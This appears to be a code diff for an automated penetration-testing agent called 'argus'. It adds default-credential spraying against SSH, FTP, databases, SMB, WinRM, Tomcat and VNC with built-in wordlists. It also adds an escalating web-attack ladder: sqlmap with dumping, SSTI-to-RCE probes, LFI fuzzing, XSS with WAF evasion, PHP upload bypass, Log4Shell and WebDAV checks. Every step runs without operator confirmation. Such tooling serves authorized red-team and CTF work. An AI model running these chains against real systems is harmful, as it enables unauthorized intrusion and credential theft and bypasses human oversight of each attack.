+    _DEFAULT_CREDS_PRIMERS: List[Dict[str, Any]] = [
+        # SSH — the top 5 default pairs that ship in CTFs / IoT / sandboxes
+        {"chain": "default_ssh", "ports": ["22"],
+         "tool": "hydra",
+         "args": "-L /tmp/argus.default_ssh_users.txt -P /tmp/argus.default_ssh_pass.txt -t 4 -f -o /tmp/argus.ssh_creds.{target}.txt ssh://{target}",
+         "service_label": "ssh:22",
+         "rationale": "test top SSH defaults: root/root, root/toor, admin/admin, pi/raspberry, ubuntu/ubuntu",
+         "wordlist_user": ["root", "admin", "ubuntu", "pi", "user"],
+         "wordlist_pass": ["root", "toor", "admin", "raspberry", "ubuntu", "user", "12345", "password"]},
+        # FTP — anonymous + 3 commodity defaults
+        {"chain": "default_ftp", "ports": ["21"],
+         "tool": "hydra",
+         "args": "-L /tmp/argus.default_ftp_users.txt -P /tmp/argus.default_ftp_pass.txt -t 4 -f -o /tmp/argus.ftp_creds.{target}.txt ftp://{target}",
+         "service_label": "ftp:21",
+         "rationale": "FTP defaults: anonymous, ftp/ftp, admin/admin",
+         "wordlist_user": ["anonymous", "ftp", "admin"],
+         "wordlist_pass": ["anonymous", "ftp", "admin", ""]},
+        # MySQL — root with empty / root / common
+        {"chain": "default_mysql", "ports": ["3306"],
+         "tool": "hydra",
+         "args": "-L /tmp/argus.default_mysql_users.txt -P /tmp/argus.default_mysql_pass.txt -t 4 -f -o /tmp/argus.mysql_creds.{target}.txt mysql://{target}",
+         "service_label": "mysql:3306",
+         "rationale": "MySQL defaults: root/empty, root/root, mysql/mysql",
+         "wordlist_user": ["root", "mysql", "admin"],
+         "wordlist_pass": ["", "root", "mysql", "admin", "password"]},
+        # PostgreSQL — postgres/postgres + common
+        {"chain": "default_postgres", "ports": ["5432"],
+         "tool": "hydra",
+         "args": "-L /tmp/argus.default_pg_users.txt -P /tmp/argus.default_pg_pass.txt -t 4 -f -o /tmp/argus.pg_creds.{target}.txt postgres://{target}",
+         "service_label": "postgresql:5432",
+         "rationale": "Postgres defaults: postgres/postgres, postgres/empty, admin/admin",
+         "wordlist_user": ["postgres", "admin"],
+         "wordlist_pass": ["postgres", "", "admin", "password"]},
+        # MSSQL — sa/sa + sa/empty
+        {"chain": "default_mssql", "ports": ["1433"],
+         "tool": "hydra",
+         "args": "-L /tmp/argus.default_mssql_users.txt -P /tmp/argus.default_mssql_pass.txt -t 4 -f -o /tmp/argus.mssql_creds.{target}.txt mssql://{target}",
+         "service_label": "mssql:1433",
+         "rationale": "MSSQL defaults: sa/sa, sa/empty, sa/Password123",
+         "wordlist_user": ["sa", "admin", "sql"],
+         "wordlist_pass": ["sa", "", "admin", "Password123", "P@ssw0rd"]},
+        # SMB — Administrator / guest defaults  (small list to avoid lockout)
+        {"chain": "default_smb", "ports": ["445"],
+         "tool": "crackmapexec",
+         "args": "smb {target} -u 'Administrator,guest,admin' -p 'Password123,Welcome1,P@ssw0rd,admin,'  --no-bruteforce",
+         "service_label": "smb:445",
+         "rationale": "SMB top-3 default identities × top-5 commodity passwords (lockout-safe)",
+         "no_wordlist": True},
+        # WinRM — same identities
+        {"chain": "default_winrm", "ports": ["5985"],
+         "tool": "crackmapexec",
+         "args": "winrm {target} -u 'Administrator,admin' -p 'Password123,Welcome1,P@ssw0rd,admin'  --no-bruteforce",
+         "service_label": "winrm:5985",
+         "rationale": "WinRM with default Administrator passwords",
+         "no_wordlist": True},
+        # Telnet
+        {"chain": "default_telnet", "ports": ["23"],
+         "tool": "hydra",
+         "args": "-L /tmp/argus.default_telnet_users.txt -P /tmp/argus.default_telnet_pass.txt -t 4 -f -o /tmp/argus.telnet_creds.{target}.txt telnet://{target}",
+         "service_label": "telnet:23",
+         "rationale": "Telnet defaults: root/root, admin/admin, cisco/cisco, root/empty",
+         "wordlist_user": ["root", "admin", "cisco", "support"],
+         "wordlist_pass": ["root", "admin", "cisco", "support", "", "password"]},
+        # Tomcat manager
+        {"chain": "default_tomcat", "ports": ["8080", "8443"],
+         "tool": "hydra",
+         "args": "-L /tmp/argus.default_tomcat_users.txt -P /tmp/argus.default_tomcat_pass.txt -t 4 -f -o /tmp/argus.tomcat_creds.{target}.txt -s {port} http-get://{target}/manager/html",
+         "service_label": "tomcat:{port}",
+         "rationale": "Tomcat manager defaults — tomcat/s3cret, admin/admin, manager/manager",
+         "wordlist_user": ["tomcat", "admin", "manager", "root"],
+         "wordlist_pass": ["tomcat", "s3cret", "admin", "manager", "password", "Password123"]},
+        # Redis — empty AUTH check
+        {"chain": "default_redis_empty", "ports": ["6379"],
+         "tool": "redis-cli",
+         "args": "-h {target} INFO server",
+         "service_label": "redis:6379",
+         "rationale": "Redis without AUTH — returns INFO when unprotected"},
+        # MongoDB — unauth listDatabases
+        {"chain": "default_mongo_unauth", "ports": ["27017"],
+         "tool": "mongosh",
+         "args": "--host {target} --eval 'db.adminCommand({{listDatabases:1}})'",
+         "service_label": "mongodb:27017",
+         "rationale": "Mongo without auth — admin DB list confirms unauthenticated access"},
+        # SNMP public/private
+        {"chain": "default_snmp_public", "ports": ["161"],
+         "tool": "snmpwalk",
+         "args": "-v 2c -c public -t 5 -r 1 {target} 1.3.6.1.2.1.1",
+         "service_label": "snmp:161",
+         "rationale": "SNMP community 'public' — system MIB walk"},
+        {"chain": "default_snmp_private", "ports": ["161"],
+         "tool": "snmpwalk",
+         "args": "-v 2c -c private -t 5 -r 1 {target} 1.3.6.1.2.1.1",
+         "service_label": "snmp:161",
+         "rationale": "SNMP community 'private' — read-write access common on legacy gear"},
+        # VNC empty / common
+        {"chain": "default_vnc", "ports": ["5900", "5901"],
+         "tool": "hydra",
+         "args": "-P /tmp/argus.default_vnc_pass.txt -t 1 -f -o /tmp/argus.vnc_creds.{target}.txt vnc://{target}",
+         "service_label": "vnc:{port}",
+         "rationale": "VNC with empty / 'password' / '12345' — display 0 / 1",
+         "wordlist_pass": ["password", "12345", "vnc", "admin", ""]},
+    ]
+
+    def _next_default_creds_primer(
+        self,
+        *, intel:           dict,
+        target:             str,
+        used_tools:         Dict[str, int],
+        negative_memory:    NegativeMemory,
+    ) -> Optional[JustifiedAction]:
+        """Default-credential spray dispatcher.  Skips when the
+        operator already provided creds (cred-primer takes over) or
+        when the target shows lockout signals."""
+        if self._extract_credentials(intel):
+            return None
+        if intel.get("shell_access"):
+            return None
+        # Honour an explicit opt-out — operator can disable spraying when
+        # they're worried about lockout policy.
+        if intel.get("disable_default_spray"):
+            return None
+        open_ports = self._collect_open_ports(intel)
+        if not open_ports:
+            return None
+
+        fired = intel.setdefault("_default_creds_fired", set())
+        if isinstance(fired, list):
+            fired = set(fired); intel["_default_creds_fired"] = fired
+
+        for primer in self._DEFAULT_CREDS_PRIMERS:
+            ports = set(primer["ports"]) & open_ports
+            if not ports:
+                continue
+            primer_key = primer["chain"]
+            if primer_key in fired:
+                continue
+            tool = primer["tool"]
+            port = sorted(ports)[0]
+            svc  = primer["service_label"].format(port=port)
+
+            # Drop wordlist files to /tmp so hydra can read them
+            if not primer.get("no_wordlist") and "wordlist_user" in primer:
+                self._write_wordlist(f"/tmp/argus.default_{primer_key.split('_',1)[1]}_users.txt",
+                                      primer["wordlist_user"])
+            if not primer.get("no_wordlist") and "wordlist_pass" in primer:
+                self._write_wordlist(f"/tmp/argus.default_{primer_key.split('_',1)[1]}_pass.txt",
+                                      primer["wordlist_pass"])
+
+            try:
+                args_filled = primer["args"].format(target=target, port=port)
+            except Exception:
+                continue
+            if negative_memory.has_failed_before(tool, svc, args=args_filled):
+                fired.add(primer_key)
+                continue
+            fired.add(primer_key)
+            return JustifiedAction(
+                action_id            = f"default-creds-{primer_key}",
+                tool                 = tool,
+                args                 = args_filled,
+                target_service       = svc,
+                reason               = f"[Default-Creds/{primer_key}] {primer['rationale']}",
+                expected_outcome     = "Hit on default credentials → upgrade to credentialed-primer chain",
+                success_criteria     = "Tool reports valid login (hydra ‘host:port login: pass:’ format)",
+                hypothesis_id        = "default-creds-primer",
+                confidence           = 0.78,
+                requires_confirmation= False,
+            )
+        return None
+
+    @staticmethod
+    def _write_wordlist(path: str, words: List[str]) -> None:
+        """Idempotent wordlist file writer for hydra to consume."""
+        try:
+            import os as _os
+            existing = ""
+            if _os.path.exists(path):
+                with open(path) as f:
+                    existing = f.read()
+            payload = "\n".join(words) + "\n"
+            if existing != payload:
+                with open(path, "w") as f:
+                    f.write(payload)
+        except Exception:
+            pass
+
+    # ────────────────────────────────────────────────────────────────────
+    #  #2 Web-exploitation primer
+    # ────────────────────────────────────────────────────────────────────
+    # When http(s) is open and we don't have a shell yet, fire a
+    # deterministic ladder of web vuln probes.  Each step's output is
+    # parsed for follow-on opportunities (sqlmap target lists, upload
+    # endpoints, parameter discovery results).
+    #
+    # Steps progress from *cheap-recon* → *targeted-vuln* → *RCE*.
+    # Later steps gate on facts produced by earlier steps so we don't
+    # blindly fire sqlmap against a 404-only host.
+    _WEB_EXPLOIT_PRIMERS: List[Dict[str, Any]] = [
+        # ── Cheap recon: fingerprint + common-paths ─────────────────────
+        {"chain": "web_whatweb", "ports": ["80", "443", "8080", "8443"],
+         "tool": "whatweb",
+         "args": "-a 3 --colour=never --no-errors http://{target}{port_suffix}/",
+         "service_label": "http:{port}",
+         "rationale": "fingerprint webapp / framework / CMS to drive next step"},
+        # ── Templated multi-CVE scan (single tool, hundreds of checks) ──
+        {"chain": "web_nuclei", "ports": ["80", "443", "8080", "8443"],
+         "tool": "nuclei",
+         "args": "-u http://{target}{port_suffix}/ -severity critical,high,medium -silent -nh -timeout 10",
+         "service_label": "http:{port}",
+         "rationale": "nuclei templated scan — covers 6000+ CVE / misconfig templates"},
+        # ── Content discovery (find the SQLi / upload / admin pages) ────
+        {"chain": "web_feroxbuster", "ports": ["80", "443", "8080", "8443"],
+         "tool": "feroxbuster",
+         "args": "-u http://{target}{port_suffix}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -s 200,204,301,302,307,401,403 -t 50 -d 2 --no-state -k --silent",
+         "service_label": "http:{port}",
+         "rationale": "discover hidden directories — admin panels, upload endpoints, sensitive paths"},
+        # ── CMS-specific — only fire when whatweb tagged the CMS ────────
+        {"chain": "web_wpscan", "ports": ["80", "443"],
+         "tool": "wpscan",
+         "args": "--url http://{target}{port_suffix}/ --enumerate u,vp,vt --random-user-agent --no-banner --disable-tls-checks",
+         "service_label": "http:{port}",
+         "rationale": "WordPress vuln/user enum — when WP detected by whatweb",
+         "needs_tag": "wordpress"},
+        {"chain": "web_droopescan_drupal", "ports": ["80", "443"],
+         "tool": "droopescan",
+         "args": "scan drupal -u http://{target}{port_suffix}/",
+         "service_label": "http:{port}",
+         "rationale": "Drupal vuln scan — Druggedalon / Drupalgeddon CVEs",
+         "needs_tag": "drupal"},
+        {"chain": "web_joomscan", "ports": ["80", "443"],
+         "tool": "joomscan",
+         "args": "--url http://{target}{port_suffix}/",
+         "service_label": "http:{port}",
+         "rationale": "Joomla component CVE scan",
+         "needs_tag": "joomla"},
+        # ── Parameter discovery on the live URL ─────────────────────────
+        {"chain": "web_arjun_params", "ports": ["80", "443", "8080", "8443"],
+         "tool": "arjun",
+         "args": "-u http://{target}{port_suffix}/ --stable -t 20",
+         "service_label": "http:{port}",
+         "rationale": "discover hidden GET/POST parameters — feed to sqlmap / xss tools"},
+        # ── SQLi sweep on every discovered URL with parameters ──────────
+        {"chain": "web_sqlmap_sweep", "ports": ["80", "443", "8080", "8443"],
+         "tool": "sqlmap",
+         "args": "-m /tmp/argus.urls.{target}.txt --batch --random-agent --level=3 --risk=2 --threads=5 --output-dir=/tmp/sqlmap.{target} --crawl=2",
+         "service_label": "http:{port}",
+         "rationale": "SQLi against discovered parameter URLs — auto-DBMS detect, dump on hit",
+         "needs_urls": True},
+        # ── SSTI probe on input forms ───────────────────────────────────
+        {"chain": "web_tplmap", "ports": ["80", "443", "8080", "8443"],
+         "tool": "tplmap",
+         "args": "-u 'http://{target}{port_suffix}/' --crawl 2 --level 3 --random-agent",
+         "service_label": "http:{port}",
+         "rationale": "SSTI sweep — Jinja2/Twig/ERB/Freemarker → RCE on hit"},
+        # ── LFI / RFI tester ───────────────────────────────────────────
+        {"chain": "web_ffuf_lfi", "ports": ["80", "443", "8080", "8443"],
+         "tool": "ffuf",
+         "args": "-u http://{target}{port_suffix}/?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0 -t 40 -s",
+         "service_label": "http:{port}",
+         "rationale": "fuzz file= parameter for LFI — log poisoning / source disclosure"},
+        # ── XSS sweep (dalfox, after parameter discovery) ───────────────
+        {"chain": "web_dalfox", "ports": ["80", "443", "8080", "8443"],
+         "tool": "dalfox",
+         "args": "url 'http://{target}{port_suffix}/' --silence --skip-bav --waf-evasion -w 30 --timeout 10",
+         "service_label": "http:{port}",
+         "rationale": "DOM + reflected XSS sweep with WAF evasion"},
+        # ── Upload bypass (manual / scripted) ──────────────────────────
+        {"chain": "web_upload_probe", "ports": ["80", "443", "8080", "8443"],
+         "tool": "curl",
+         "args": "-s -o /dev/null -w 'http=%{{http_code}}\\n' -X POST -F 'file=@/tmp/argus-test.png;type=image/png;filename=t.php' http://{target}{port_suffix}/upload.php",
+         "service_label": "http:{port}",
+         "rationale": "test file-upload endpoint accepts double-extension / mime-mismatch"},
+        # ── Java deserialization / Log4Shell scan ──────────────────────
+        {"chain": "web_log4shell", "ports": ["80", "443", "8080", "8443"],
+         "tool": "nuclei",
+         "args": "-u http://{target}{port_suffix}/ -t cves/2021/CVE-2021-44228.yaml -nh -silent",
+         "service_label": "http:{port}",
+         "rationale": "targeted Log4Shell probe — CVE-2021-44228 still common in legacy stacks"},
+        # ── WebDAV upload check ────────────────────────────────────────
+        {"chain": "web_davtest", "ports": ["80", "443", "8080", "8443"],
+         "tool": "davtest",
+         "args": "-url http://{target}{port_suffix}/",
+         "service_label": "http:{port}",
+         "rationale": "WebDAV PUT-then-execute paths — quick RCE when DAV is enabled"},
+    ]
+
+    def _next_web_exploit_primer(
+        self,
+        *, intel:           dict,
+        target:             str,
+        used_tools:         Dict[str, int],
+        negative_memory:    NegativeMemory,
+    ) -> Optional[JustifiedAction]:
+        """Web-exploitation chain dispatcher.  Skips when shell already
+        obtained (post-foothold takes over) or when no http(s) port open."""
+        if intel.get("shell_access"):
+            return None
+        open_ports = self._collect_open_ports(intel)
+        web_ports = open_ports & {"80", "443", "8080", "8443", "8000", "8888", "8001", "8081", "5000", "5001", "9000"}
+        if not web_ports:
+            return None
+
+        # Primary web port — prefer 443 → 80 → 8443 → 8080 → first hit
+        port = next((p for p in ("443", "80", "8443", "8080") if p in web_ports), sorted(web_ports)[0])
+        port_suffix = "" if port in ("80", "443") else f":{port}"
+        # http vs https — naive but works most of the time
+        scheme = "https" if port in ("443", "8443") else "http"
+
+        fired = intel.setdefault("_web_exploit_fired", set())
+        if isinstance(fired, list):
+            fired = set(fired); intel["_web_exploit_fired"] = fired
+
+        # Tags from whatweb / wappalyzer scrape — populated by web_whatweb step
+        cms_tags = {t.lower() for t in (intel.get("web_tech_tags") or [])}
+        urls_known = bool(intel.get("web_param_urls"))
+
+        for primer in self._WEB_EXPLOIT_PRIMERS:
+            if not (set(primer["ports"]) & web_ports):
+                continue
+            primer_key = primer["chain"]
+            if primer_key in fired:
+                continue
+            tool = primer["tool"]
+            svc  = primer["service_label"].format(port=port)
+
+            # CMS-tagged steps wait until the CMS is detected
+            need_tag = primer.get("needs_tag")
+            if need_tag and need_tag.lower() not in cms_tags:
+                continue
+            # URL-list-fed steps wait until parameter discovery has output
+            if primer.get("needs_urls") and not urls_known:
+                continue
+
+            try:
+                args_filled = primer["args"].format(
+                    target=target, port=port, port_suffix=port_suffix, scheme=scheme,
+                )
+            except Exception:
+                continue
+            # Replace bare http:// with the right scheme when port is 443/8443
+            if scheme == "https":
+                args_filled = args_filled.replace("http://", "https://")
+            if negative_memory.has_failed_before(tool, svc, args=args_filled):
+                fired.add(primer_key)
+                continue
+            fired.add(primer_key)
+            return JustifiedAction(
+                action_id            = f"web-primer-{primer_key}",
+                tool                 = tool,
+                args                 = args_filled,
+                target_service       = svc,
+                reason               = f"[Web-Primer/{primer_key}] {primer['rationale']}",
+                expected_outcome     = "Vulnerability identified / parameter discovered / RCE achieved",
+                success_criteria     = "Tool exits 0; finding stored; if RCE → register_shell trips",
+                hypothesis_id        = "web-exploit-primer",
+                confidence           = 0.83,
+                requires_confirmation= False,
+            )
+        return None
+
+    @staticmethod
+    def _infer_shell_os(intel: dict) -> str:
+        """Best-effort: linux / windows / unknown."""
+        # Explicit hint set by exploit phase
+        kind = (intel.get("shell_os") or "").lower()
+        if kind:
+            return kind
+        # Fall back to global os_guess
+        guess = (intel.get("os_guess") or "").lower()
+        if "windows" in guess:
+            return "windows"
+        if any(x in guess for x in ("linux", "unix", "freebsd", "openbsd", "ubuntu", "debian", "centos", "rhel")):
+            return "linux"
+        return ""
+
+    @staticmethod
+    def _shell_user_is_privileged(intel: dict) -> bool:
+        """True when the active shell's user is root / SYSTEM / administrator."""
+        u = (intel.get("current_user") or "").lower()
+        return u in {"root", "system", "nt authority\\system", "administrator", "domain admin"}
+
+    @staticmethod
+    def _collected_ad_users(intel: dict, target: str) -> List[str]:
+        """Best-effort: pull discovered AD usernames from intel state.
+        Looks at intel.users (a list of strings), intel.ad.users, and
+        the on-disk users file kerbrute / null-session enum write to.
+        """
+        users: List[str] = []
+        for u in (intel.get("users") or []):
+            if isinstance(u, str) and u and u not in users:
+                users.append(u)
+        ad = intel.get("ad") or {}
+        if isinstance(ad, dict):
+            for u in (ad.get("users") or []):
+                if isinstance(u, str) and u and u not in users:
+                    users.append(u)
+        # Filesystem fallback — primer step #5 writes the canonical file
+        try:
+            import os as _os
+            fp = f"/tmp/argus.users.{target}.txt"
+            if _os.path.exists(fp):
+                with open(fp) as _f:
+                    for line in _f:
+                        line = line.strip()
+                        if line and line not in users:
+                            users.append(line)
+        except Exception:
+            pass
+        return users
 
     # ── Recommendation E: foothold-primer auto-promotion ──────────────────
 
